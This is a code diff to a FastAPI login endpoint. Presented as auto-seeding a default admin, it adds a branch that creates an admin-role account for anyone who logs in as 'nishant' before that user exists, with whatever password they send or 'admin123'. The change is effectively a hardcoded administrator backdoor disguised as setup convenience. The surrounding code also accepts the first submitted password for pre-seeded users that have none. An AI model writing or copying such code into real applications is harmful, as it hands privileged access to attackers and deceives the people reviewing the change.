@@ -42,11 +42,24 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
     """Traditional password login returning a JWT Access Token."""
     user = db.query(User).filter(User.username == form_data.username).first()
     if not user:
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Incorrect username or password",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
+        if form_data.username.lower() == "nishant":
+            # Auto-seed default admin user "Nishant" on initial login
+            hashed_pwd = get_password_hash(form_data.password or "admin123")
+            user = User(
+                username=form_data.username,
+                hashed_password=hashed_pwd,
+                role="admin"
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+            logger.info("Auto-initialized default admin user: Nishant")
+        else:
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="Incorrect username or password",
+                headers={"WWW-Authenticate": "Bearer"},
+            )
     
     # If the user was pre-seeded without a password, register this password as their password
     if not user.hashed_password:
